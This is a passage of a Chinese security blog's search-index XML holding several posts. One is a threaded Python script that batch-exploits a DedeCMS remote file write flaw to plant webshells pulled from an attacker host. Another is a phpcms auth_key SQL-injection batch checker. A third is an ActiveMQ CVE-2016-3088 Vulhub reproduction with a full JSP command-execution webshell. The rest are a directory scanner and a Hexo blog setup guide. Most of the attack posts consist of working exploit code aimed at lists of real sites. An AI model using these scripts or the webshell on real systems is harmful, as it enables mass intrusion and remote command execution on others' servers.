alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>dedecms远程文件写入漏洞检测</title>
      <link href="/posts/8284a757.html"/>
      <url>/posts/8284a757.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>Dedecms远程文件写入漏洞。出现于/install/index.php.bak这个文件<br>详细情况请看：<a href="http://www.k2a.cn/131.html" target="_blank" rel="noopener">http://www.k2a.cn/131.html</a></p><p><img src="https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=1906298132,553206994&amp;fm=27&amp;gp=0.jpg" alt=""></p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p><strong>思路：</strong></p><pre><code>1.先发送请求 /install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=../data/admin/config_update.php 进行清空2.构造shell进行写入请求3.验证shell是否存在</code></pre><p>一开始我直接判断是否防火墙之类的东西，导致后面没有办法成功。所以<br>我这里就没有些判断什么防火墙的东西。直接判断shell有没有写入成功</p><p>代码：</p><pre><code>import requestsimport osimport threadingpayload=[&apos;/install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=../data/xx.php&amp;updateHost=http://your-IP/&apos;,&apos;/data/xx.php&apos;,&apos;shell的特征&apos;]user=input(&apos;file:&apos;)if os.path.exists(user): //判断文件是否存在    print(&apos;[+]open {} ok !&apos;.format(user))else:    print(&apos;[-]Not found {}&apos;.format(user))    exit()def explot(urls):    headers = {&apos;user-agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&apos;}    url1=&quot;{}&quot;.format(urls+payload[0]).strip() //构造URL     url2=&quot;{}&quot;.format(urls+payload[1]).strip()    gjz=payload[2]    try:        rw=requests.get(url=&apos;{}/install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=../data/admin/config_update.php &apos;.format(urls),headers=headers) //发送请求进行清空        rqt=requests.get(url=url1,headers=headers)  //远程写入        rqt2=requests.get(url=url2,headers=headers)         if gjz in rqt2.text or gjz in rqt2.content.decode(&apos;utf-8&apos;): //判断是否成功写入shell            print(&apos;[+]shell url:{}&apos;.format(rqt2.url)            print(&apos;[+]shell url:{}&apos;.format(rqt2.url),file=open(&apos;good.txt&apos;,&apos;a&apos;))        else:            print(&apos;[-]no shell {}&apos;.format(rqt2.url))    except:        passif __name__ == &apos;__main__&apos;:    dk=open(&apos;{}&apos;.format(user),&apos;r&apos;)    for r in dk.readlines():        qc=&quot;&quot;.join(r.split(&apos;\n&apos;))        t=threading.Thread(target=explot,args=(qc,))        t.start()</code></pre><p>测试结果:<br><img src="https://i.imgur.com/qvZeGSc.png" alt=""></p><p><img src="https://i.imgur.com/f3AJ3tb.png" alt=""></p><p>转载请注明：出自422926799.Github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>phpcmssqllin</title>
      <link href="/posts/d74d279d.html"/>
      <url>/posts/d74d279d.html</url>
      <content type="html"><![CDATA[<h1 id="phpcms-auth-key注入漏洞批量检测"><a href="#phpcms-auth-key注入漏洞批量检测" class="headerlink" title="phpcms auth_key注入漏洞批量检测"></a>phpcms auth_key注入漏洞批量检测</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>一位基友问我能不能写批检，然后就写了。这个漏洞主要是因为auth_key泄露造成的sql注入漏洞。中专检测的php网上已经有了<br>我们只需要写个批量检测就行了。</p><p><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=2127804709,2109998066&amp;fm=27&amp;gp=0.jpg" alt=""></p><h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><pre><code>1.首先你得了解这个漏洞为什么会发生？我该怎么去利用？详细请看这篇文章：https://www.waitalone.cn/phpcmsv9-authkey-sql.html2.居然已经给出了PHP的中专检测脚本，我们只需要批量替换掉php检测脚本的URL和key。然后生成新的修改好的PHP文件放入一个目录即可3.然后把生成的目录放入你的PHP环境，进行读取该路径下的所有PHP文件名。然后发送请求判断返回结果是0还是-1即可。（0代表无漏洞，-1代表有漏洞）</code></pre><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>jsqllin.py</p><pre><code>import requestsimport osimport rekeys=[]#if os.path.exists(&apos;v9.php&apos;): #   print(&apos;[+]ok v9.php&apos;)##  print(&apos;[-]not found v9.php&apos;)  #  exit()xs=open(&apos;saveurl.txt&apos;,&apos;w&apos;)xs.close()print(&apos;[+]Write url&apos;)dw=open(&apos;phpv9_key_leak.txt&apos;,&apos;r&apos;)for j in dw.readlines():    ldw=&quot;&quot;.join(j.split(&apos;\n&apos;))    qe = re.finditer(&apos;(http|https)://(www.)?(\w+(\.)?)+&apos;, ldw) //正则提取出URL    for q in qe:        rc = re.findall(&quot;[a-zA-z]+://[^\s]*&quot;, str(q))        for j in rc:            we = &quot;{}&quot;.format(j).replace(&apos;&gt;&apos;, &apos;&apos;).replace(&quot;&apos;&quot;, &apos;&apos;)            print(we,file=open(&apos;saveurl.txt&apos;,&apos;a&apos;))wc=[]lo=open(&apos;keys.txt&apos;,&apos;w&apos;)lo.close()dkv=open(&apos;phpv9_key_leak.txt&apos;,&apos;r&apos;)for r in dkv.readlines():    wq=&quot;&quot;.join(r.split(&apos;\n&apos;))    qe=re.sub(&apos;(http|https)://(www.)?(\w+(\.)?)+&apos;,&apos;&apos;,wq)    qc=re.sub(&apos;\|&apos;,&apos;&apos;,str(qe))    tx=re.findall(&apos;[a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9]&apos;,str(qc)) //正则提取出key    for k in tx:        print(k,file=open(&apos;keys.txt&apos;,&apos;a&apos;))pds2=[]wqe2=[]pds=open(&apos;saveurl.txt&apos;,&apos;r&apos;)wqe=open(&apos;keys.txt&apos;,&apos;r&apos;)for b in pds.readlines():    pds2.append(&quot;&quot;.join(b.split(&apos;\n&apos;)))for w in wqe.readlines():    wqe2.append(&quot;&quot;.join(w.split(&apos;\n&apos;)))for x in range(int(len(pds2))): //读取pds（key列表里面的长度）生成对应数量的PHP文件    os.mknod(&apos;scv/{}v9.php&apos;.format(x))dr=os.listdir(&apos;scv&apos;) //读取scv目录下所有的PHP文件for d in range(0,len(pds2)):    print(&quot;&quot;&quot;&lt;?phpset_time_limit(0);$wang_url = &apos;{}&apos;; &quot;&quot;&quot;.format(pds2[d])+&quot;&quot;&quot; $auth_key = &apos;{}&apos;;&quot;&quot;&quot;.format(wqe2[d])+&quot;&quot;&quot; $str = &quot;uid=1&quot; . stripslashes($_GET[&apos;id&apos;]);$encode = sys_auth($str, &apos;ENCODE&apos;, $auth_key);$content = file_get_contents($wang_url . &quot;/phpsso_server/?m=phpsso&amp;c=index&amp;a=getuserinfo&amp;appid=1&amp;data=&quot; . $encode);echo $content;function sys_auth($string, $operation = &apos;ENCODE&apos;, $key = &apos;&apos;, $expiry = 0){    $key_length = 4;    $key = md5($key);    $fixedkey = hash(&apos;md5&apos;, $key);    $egiskeys = md5(substr($fixedkey, 16, 16));    $runtokey = $key_length ? ($operation == &apos;ENCODE&apos; ? substr(hash(&apos;md5&apos;, microtime(true)), -$key_length) : substr($string, 0, $key_length)) : &apos;&apos;;    $keys = hash(&apos;md5&apos;, substr($runtokey, 0, 16) . substr($fixedkey, 0, 16) . substr($runtokey, 16) . substr($fixedkey, 16));    $string = $operation == &apos;ENCODE&apos; ? sprintf(&apos;%010d&apos;, $expiry ? $expiry + time() : 0) . substr(md5($string . $egiskeys), 0, 16) . $string : base64_decode(substr($string, $key_length));    $i = 0;    $result = &apos;&apos;;    $string_length = strlen($string);    for ($i = 0; $i &lt; $string_length; $i++) {        $result .= chr(ord($string{$i}) ^ ord($keys{$i % 32}));    }    if ($operation == &apos;ENCODE&apos;) {        return $runtokey . str_replace(&apos;=&apos;, &apos;&apos;, base64_encode($result));    } else {        if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26) . $egiskeys), 0, 16)) {            return substr($result, 26);        } else {            return &apos;&apos;;        }    }}?&gt;    &quot;&quot;&quot;,file=open(&apos;scv/{}&apos;.format(dr[d]),&apos;a&apos;)) //这个公司会将修改好的逐个写入</code></pre><p>jiances.py</p><pre><code>import requestsimport osprint(&apos;[!]请确保你把生成的php文件夹拷贝到你的php环境目录之下，然后请输入目录的路径。我将获取路径下所有的文件进行检测&apos;)user=input(&apos;path:&apos;)xj=open(&apos;save.txt&apos;,&apos;w&apos;)xj.close()def exploitsqllin():    cs=os.listdir(user) //读取指定列表下的所有文件    headers={&apos;user-gent&apos;:&apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&apos;}    for s in cs: //遍历        print(s,file=open(&apos;save.txt&apos;,&apos;a&apos;)) //写入txt    dk=open(&apos;save.txt&apos;,&apos;r&apos;)     for r in dk.readlines():        wed=&quot;&quot;.join(r.split(&apos;\n&apos;))        urls=&apos;http://127.0.0.1/scv/{}?id=1&apos;.format(wed) //遍历txt之后构造URL        rq=requests.get(url=urls,headers=headers) //发送请求进行判断        if &apos;0&apos; in rq.text:             print(&apos;[-]Not bug {}&apos;.format(rq.url))        elif &apos;-1&apos; in rq.text:            print(&apos;[+]Bug url {}&apos;.format(rq.url))exploitsqllin()</code></pre><p>图片：</p><p>生成的php<br><img src="https://i.imgur.com/bP9cbAG.png" alt=""></p><p><img src="https://i.imgur.com/9490Rej.png" alt=""></p><p>检测结果：<br><img src="https://i.imgur.com/2EyNcfM.png" alt=""></p><p><img src="https://i.imgur.com/939Jan6.png" alt=""></p><p>漏洞几率不是很大</p><pre><code>[-]Not bug http://127.0.0.1/scv/79v9.php?id=1[-]Not bug http://127.0.0.1/scv/66v9.php?id=1[-]Not bug http://127.0.0.1/scv/2v9.php?id=1[+]Bug url http://127.0.0.1/scv/45v9.php?id=1[-]Not bug http://127.0.0.1/scv/47v9.php?id=1[-]Not bug http://127.0.0.1/scv/74v9.php?id=1[-]Not bug http://127.0.0.1/scv/91v9.php?id=1[-]Not bug http://127.0.0.1/scv/90v9.php?id=1[-]Not bug http://127.0.0.1/scv/88v9.php?id=1[-]Not bug http://127.0.0.1/scv/57v9.php?id=1[+]Bug url http://127.0.0.1/scv/89v9.php?id=1[-]Not bug http://127.0.0.1/scv/78v9.php?id=1[-]Not bug http://127.0.0.1/scv/14v9.php?id=1[-]Not bug http://127.0.0.1/scv/5v9.php?id=1[-]Not bug http://127.0.0.1/scv/15v9.php?id=1[-]Not bug http://127.0.0.1/scv/63v9.php?id=1[-]Not bug http://127.0.0.1/scv/76v9.php?id=1[-]Not bug http://127.0.0.1/scv/87v9.php?id=1[+]Bug url http://127.0.0.1/scv/26v9.php?id=1[-]Not bug http://127.0.0.1/scv/72v9.php?id=1[+]Bug url http://127.0.0.1/scv/43v9.php?id=1[-]Not bug http://127.0.0.1/scv/84v9.php?id=1[-]Not bug http://127.0.0.1/scv/25v9.php?id=1[+]Bug url http://127.0.0.1/scv/92v9.php?id=1[-]Not bug http://127.0.0.1/scv/13v9.php?id=1[-]Not bug http://127.0.0.1/scv/71v9.php?id=1[-]Not bug http://127.0.0.1/scv/75v9.php?id=1[-]Not bug http://127.0.0.1/scv/56v9.php?id=1[-]Not bug http://127.0.0.1/scv/19v9.php?id=1[+]Bug url http://127.0.0.1/scv/50v9.php?id=1[-]Not bug http://127.0.0.1/scv/31v9.php?id=1[-]Not bug http://127.0.0.1/scv/41v9.php?id=1[-]Not bug http://127.0.0.1/scv/53v9.php?id=1[-]Not bug http://127.0.0.1/scv/37v9.php?id=1[-]Not bug http://127.0.0.1/scv/44v9.php?id=1[-]Not bug http://127.0.0.1/scv/85v9.php?id=1[-]Not bug http://127.0.0.1/scv/42v9.php?id=1[+]Bug url http://127.0.0.1/scv/52v9.php?id=1[+]Bug url http://127.0.0.1/scv/17v9.php?id=1[-]Not bug http://127.0.0.1/scv/64v9.php?id=1[-]Not bug http://127.0.0.1/scv/80v9.php?id=1[-]Not bug http://127.0.0.1/scv/3v9.php?id=1[-]Not bug http://127.0.0.1/scv/4v9.php?id=1[-]Not bug http://127.0.0.1/scv/58v9.php?id=1[-]Not bug http://127.0.0.1/scv/68v9.php?id=1[-]Not bug http://127.0.0.1/scv/48v9.php?id=1[-]Not bug http://127.0.0.1/scv/20v9.php?id=1[+]Bug url http://127.0.0.1/scv/38v9.php?id=1[-]Not bug http://127.0.0.1/scv/62v9.php?id=1[-]Not bug http://127.0.0.1/scv/29v9.php?id=1[-]Not bug http://127.0.0.1/scv/24v9.php?id=1[-]Not bug http://127.0.0.1/scv/32v9.php?id=1[-]Not bug http://127.0.0.1/scv/61v9.php?id=1[-]Not bug http://127.0.0.1/scv/86v9.php?id=1[-]Not bug http://127.0.0.1/scv/46v9.php?id=1[-]Not bug http://127.0.0.1/scv/33v9.php?id=1[-]Not bug http://127.0.0.1/scv/39v9.php?id=1[-]Not bug http://127.0.0.1/scv/1v9.php?id=1[-]Not bug http://127.0.0.1/scv/51v9.php?id=1[-]Not bug http://127.0.0.1/scv/93v9.php?id=1[-]Not bug http://127.0.0.1/scv/36v9.php?id=1[-]Not bug http://127.0.0.1/scv/81v9.php?id=1[-]Not bug http://127.0.0.1/scv/83v9.php?id=1[-]Not bug http://127.0.0.1/scv/27v9.php?id=1[-]Not bug http://127.0.0.1/scv/55v9.php?id=1[-]Not bug http://127.0.0.1/scv/23v9.php?id=1[-]Not bug http://127.0.0.1/scv/12v9.php?id=1[-]Not bug http://127.0.0.1/scv/95v9.php?id=1[-]Not bug http://127.0.0.1/scv/40v9.php?id=1[-]Not bug http://127.0.0.1/scv/0v9.php?id=1[-]Not bug http://127.0.0.1/scv/77v9.php?id=1[-]Not bug http://127.0.0.1/scv/35v9.php?id=1[-]Not bug http://127.0.0.1/scv/73v9.php?id=1[-]Not bug http://127.0.0.1/scv/21v9.php?id=1[-]Not bug http://127.0.0.1/scv/18v9.php?id=1[-]Not bug http://127.0.0.1/scv/65v9.php?id=1[-]Not bug http://127.0.0.1/scv/16v9.php?id=1[-]Not bug http://127.0.0.1/scv/34v9.php?id=1[-]Not bug http://127.0.0.1/scv/59v9.php?id=1[+]Bug url http://127.0.0.1/scv/94v9.php?id=1[-]Not bug http://127.0.0.1/scv/10v9.php?id=1[-]Not bug http://127.0.0.1/scv/22v9.php?id=1</code></pre><p>转载请声明：来之九世的博客</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ActiveMQ任意文件写入漏洞（CVE-2016-3088）</title>
      <link href="/posts/55a9538c.html"/>
      <url>/posts/55a9538c.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>学习完Rust的Vector，想着复现一下Vulhub里面的漏洞。然后就踩到了一个坑了。= =简直MMP，原本是想着写CVE-2015-5254的复现的。可复现方法不能用了。所以emmmm….<br><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=886494489,586744998&amp;fm=27&amp;gp=0.jpg" alt=""></p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p>首先我们要搭建Vulhub的环境：</p><pre><code>Vulhub漏靶场搭建方法：vulhub官网：http://vulhub.org/#/docs/download-vulhub/1.安装docker，windows自己去官网下。Linux执行：sudo apt-get install docker.io2.安装python和pip:sudo apt-get install python和suao apt-get install python-pip3.安装docker-compose:pip install docker-compose4.下载Vulhub：git clone https://github.com/vulhub/vulhub.git安装好之后进入对应的漏洞文件执行：docker-compose up -d如果出现：Couldn&apos;t connect to Docker daemon at http+xxx的问题有三个解决的方法：1.将当前的用户加入dokcer用户组 sudo usermod -aG docker &lt;Username&gt;2.在使用docker-compose附加上sudo sudo docker-compose up -d3.设置DOCKER_HOST这一个环境变量 export DOCKER_HOST=tcp://loaclhost:4243 设置完成后重新启动docker</code></pre><p>漏洞介绍：</p><pre><code>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：其使用率并不高文件操作容易出现漏洞所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。</code></pre><p>在测试过程中，可以关注ActiveMQ的版本，避免走弯路。</p><p>这里我的是CVE-2016-3088,所以我们要进入对应的目录：</p><pre><code>cd /vulhub/activemq/CVE-2016-3088 </code></pre><p><img src="https://i.imgur.com/VZ5imMu.png" alt=""></p><pre><code>然后执行docker-compose -build 下载漏洞环境然后在执行docker-compose up -d 启动</code></pre><p>之后我们打开浏览器访问：</p><pre><code>http://127.0.0.1:8161</code></pre><p>我们可以看到如下图所示：</p><p><img src="https://i.imgur.com/uoF1A1z.png" alt=""></p><p>这个任意文件写入漏洞得要先知道WEB路径。所以我们得登陆后台<br>默认用户名和密码是：admin/admin，登陆进去后我们要访问</p><pre><code>http://your-ip:8161/admin/test/systemProperties.jsp</code></pre><p>查看ActiveMQ的绝对路径</p><p><img src="https://i.imgur.com/LpIcgNx.png" alt=""></p><p>绝对路径为：</p><pre><code>/opt/activemq</code></pre><p>知道绝对路径之后，我们要进行文件上传。<br><img src="https://i.imgur.com/MyFt8se.png" alt=""></p><p>注：这里的shell2.txt为shell代码<br>shell代码如下：</p><pre><code>&lt;%@ page import=&quot;java.util.*,java.io.*&quot;%&gt; &lt;% %&gt; &lt;HTML&gt;&lt;BODY&gt; &lt;FORM METHOD=&quot;GET&quot; NAME=&quot;comments&quot; ACTION=&quot;&quot;&gt;&lt;INPUT TYPE=&quot;text&quot; NAME=&quot;comment&quot;&gt; &lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt; &lt;/FORM&gt; &lt;pre&gt; &lt;% if ( request.getParameter( &quot;comment&quot; ) != null ) {     out.println( &quot;Command: &quot; + request.getParameter( &quot;comment&quot; ) + &quot;&lt;BR&gt;&quot; );     Process p        = Runtime.getRuntime().exec( request.getParameter( &quot;comment&quot; ) );     OutputStream os    = p.getOutputStream();     InputStream in        = p.getInputStream();     DataInputStream dis    = new DataInputStream( in );     String disr        = dis.readLine();     while ( disr != null )     {         out.println( disr ); disr = dis.readLine();     } } %&gt; &lt;/pre&gt;  &lt;/BODY&gt;&lt;/HTML&gt;</code></pre><p>代码来自：<a href="https://github.com/JoyChou93/webshell/blob/master/jsp/cmd.jsp" title="JSP shell" target="_blank" rel="noopener">https://github.com/JoyChou93/webshell/blob/master/jsp/cmd.jsp</a></p><p>上传：<br><img src="https://i.imgur.com/dSa5cgB.png" alt=""></p><p>HTTP状态码为204，即为上传成功</p><p>然后听过MOVE进行改名为jsp<br><img src="https://i.imgur.com/YdINGV6.png" alt=""></p><p>然后我们访问<a href="http://127.0.0.1:8161/api,就可以看到我们上传的shell文件" target="_blank" rel="noopener">http://127.0.0.1:8161/api,就可以看到我们上传的shell文件</a></p><p><img src="https://i.imgur.com/asEAY27.png" alt=""></p><p>执行命令如下：<br><img src="https://i.imgur.com/AI0RAO3.png" alt=""></p><p>ActiveMQ更多漏洞：<a href="http://www.freebuf.com/column/161188.html" title="更多漏洞" target="_blank" rel="noopener">http://www.freebuf.com/column/161188.html</a></p><p>转载请声明：来之422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python扫描web路径小工具</title>
      <link href="/posts/8a2431fe.html"/>
      <url>/posts/8a2431fe.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>今天逛朋友圈的时候。发现了车王说，用python写web路径扫描的小伙伴门用head别用get。<br>后来我去百度了查了一下发现Head和Get的不同之处。所以有了以下这篇文章。<br></p><h1 id="请求对比："><a href="#请求对比：" class="headerlink" title="请求对比："></a>请求对比：</h1><p>GET：使用GET请求某个路径获取返回的响应。请求参数会暴露在外<br><br>HEAD：特别适用在优先的速度和带宽下 <br><br>1.检查资源的有效性。 <br><br>2.检查超链接的有效性。 <br><br>3.检查网页是否被串改。 <br><br>4.多用于自动搜索机器人获取网页的标志信息，获取rss种子信息，或者传递安全认证信息等。 <br><br><img src="https://i.imgur.com/EM4AYjv.png" alt=""></p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p>思路：让使用者可以调用指定的web字典进行扫描，添加过滤信息。<br>当返回的URL的状态码为200并且无过滤列表里面关键字则判定为存在该路径。</p><p><strong>代码：</strong></p><pre><code>import requestsimport osurlw=[]okurl=[]noturl=[]error=[&apos;404&apos;,&apos;Not Found&apos;,&apos;403&apos;,&apos;找不到&apos;,&apos;没有权限&apos;,&apos;360&apos;,&apos;云锁&apos;,&apos;网站防火墙&apos;,&apos;D盾&apos;,&apos;百度云加速&apos;] //过滤列表headers={&apos;user-agent&apos;:&apos;Opera/9.80(WindowsNT6.1;U;en)Presto/2.8.131Version/11.11&apos;}ld=os.listdir(&apos;dict&apos;)print(&apos;[+]Discovery directory&apos;)for l in ld:    print(&apos;[+]find&apos;,l)print(&apos;&apos;)user=input(&apos;Please choose:&apos;)user2=input(&apos;Enter your URL:&apos;)if os.path.exists(&apos;dict/{}&apos;.format(user)):    print(&apos;[+]File existence {}&apos;.format(user))else:    print(&apos;[-]file does not exist {}&apos;.format(user))    exit()ope=open(&apos;dict/{}&apos;.format(user),&apos;r&apos;)for r in ope.readlines():    url=user2.strip()+&quot;&quot;.join(r.split(&apos;\n&apos;))    urlw.append(url)def ether(urls):    try:        reqt=requests.head(url=urls,headers=headers,allow_redirects=True)        for e in error:            if reqt.status_code==200 and e not in reqt.text: //判断                yes=&apos;[200]=&gt;Discovery path:{}&apos;.format(reqt.url)                if yes in okurl:continue //去重                okurl.append(yes)                print(yes)            else:                no=&apos;[{}]=&gt;Can t find:{}&apos;.format(reqt.status_code,reqt.url)                if no in noturl:continue //去重                noturl.append(no)                print(no)    except Exception as g:        print(&apos;[-]Error in {} url:{}&apos;.format(g,reqt.url))for w in urlw:    ether(w)</code></pre><p><strong>测试效果：</strong><br><img src="https://i.imgur.com/eAIMARt.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>用Github+Hexo搭建一个属于自己的博客</title>
      <link href="/posts/5358472d.html"/>
      <url>/posts/5358472d.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>在博客园写的博文和别人用github+hexo搭建起来的对比。感觉别人的好高大上= =，然后昨天晚上黑哥也在搞看的我也想搞。就有了以下的故事<br>虽然之前按照车王的方法失败了一次，但是还是死心不改在试一次，后面成功了。<br><br>我的环境：OS:Ubuntu<br><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=257909425,2915417066&amp;fm=27&amp;gp=0.jpg" alt=""></p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><hr><p>首先你得拥有一个属于你的Github账号，如果没有就去注册<br><br>Github官网：<a href="https://github.com" target="_blank" rel="noopener">https://github.com</a></p><p>注册好之后，去新建一个项目。为<username>github.io,必须是你的username。否则会有很多的麻烦<br></username></p><p><img src="https://i.imgur.com/LkZquwd.png" alt=""></p><p>然后你在你电脑里面安装Git,nodejs,hexo,npm<br></p><ol><li>windows安装Git：<a href="https://git-scm.com/" target="_blank" rel="noopener">https://git-scm.com/</a> Git官网自行下载安装<br></li><li>Linux下安装： sudo apt-get install git<br></li><li>windows安装nodejs：<a href="https://www.cnblogs.com/hackyo/p/8110951.html" target="_blank" rel="noopener">https://www.cnblogs.com/hackyo/p/8110951.html</a> //安装nodejs教程和npm教程<br></li><li>Linux下安装nodejs：<a href="https://blog.csdn.net/u014361775/article/details/78865582" target="_blank" rel="noopener">https://blog.csdn.net/u014361775/article/details/78865582</a> //安装nodejs和npm教程<br></li><li>安装hexo：npm i -g hexo<br></li><li>查看hexo是否安装成功：hexo -v<br></li><li>hexo初始化：hexo init<br><br>初始化之后你的目录下会出现以下文件夹：<br><br><img src="https://i.imgur.com/YsKwGqW.png" alt=""><br>node_modules：是依赖包<br><br>public：存放的是生成的页面<br><br>scaffolds：命令生成文章等的模板<br><br>source：用命令创建的各种文章<br><br>themes：主题<br><br>_config.yml：整个博客的配置<br><br>db.json：source解析所得到的<br><br>package.json：项目所需模块项目的配置信息<br></li></ol><p>干好之后就开始配置你的hexo了，打开_config.yml配置文件,进行更改。<br><br><img src="https://i.imgur.com/37KDIEA.png" alt=""><br>然后下载你喜欢的模板进行替换，模板在hexo官网自己挑选下载到themes里面。修改根目录下的_config.yml找到themes进行模板替换<br><br>替换完之后预览一下效果。<br><br>hexo clean<br><br>hexo generate<br><br>hexo server<br><br>打开浏览器访问：<a href="http://127.0.0.1:4000" target="_blank" rel="noopener">http://127.0.0.1:4000</a><br><br>我这里的主题是仙人掌大法<br><br><img src="https://i.imgur.com/i3Fumv1.png" alt=""><br>做好这些以后，你得创建ssh<br><br>在gitbash中输入：ssh-keygen -t rsa -C “<a href="mailto:youremail@example.com" target="_blank" rel="noopener">youremail@example.com</a>，生成ssh。然后按下图的方式找到id_rsa.pub文件的内容。<br><br>然后去github找到setting添加ssh key。<br><br><img src="https://i.imgur.com/tNcZBqg.png" alt=""><br>在gitbash中验证是否添加成功：ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a><br><br>完成下一步你就成功啦！<br><br>安装deploy<br><br>npm install hexo-deployer-git –save<br><br>安装之后，去修改你的_config.yml下的deploy。<br>类似于这样子的：<br></p><pre><code>deploy:      type:git    repository:git@github.com:422926799/422926799.github.io.git    branch:master</code></pre><p>弄好之后执行：hexo d -g 即可部署你的博客。访问<a href="https://xxx.github.io就能看到了。" target="_blank" rel="noopener">https://xxx.github.io就能看到了。</a><br>hexo的基本命令：</p><pre><code>hexo n &quot;我的博客&quot; == hexo new &quot;我的博客&quot; #新建文章hexo p == hexo publishhexo g == hexo generate#生成hexo s == hexo server #启动服务预览hexo d == hexo deploy#部署hexo server #Hexo 会监视文件变动并自动更新，您无须重启服务器。hexo server -s #静态模式hexo server -p 5000 #更改端口hexo server -i 192.168.1.1 #自定义 IPhexo clean #清除缓存 网页正常情况下可以忽略此条命令hexo g #生成静态网页hexo d #开始部署hexo new &quot;postName&quot; #新建文章hexo new page &quot;pageName&quot; #新建页面hexo generate #生成静态页面至public目录hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server）hexo deploy #将.deploy目录部署到GitHubhexo new [layout] &lt;title&gt;hexo new photo &quot;My Gallery&quot;hexo new &quot;Hello World&quot; --lang tw</code></pre><p><strong><br>转载请注明：来只422926799.github.io。</strong></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
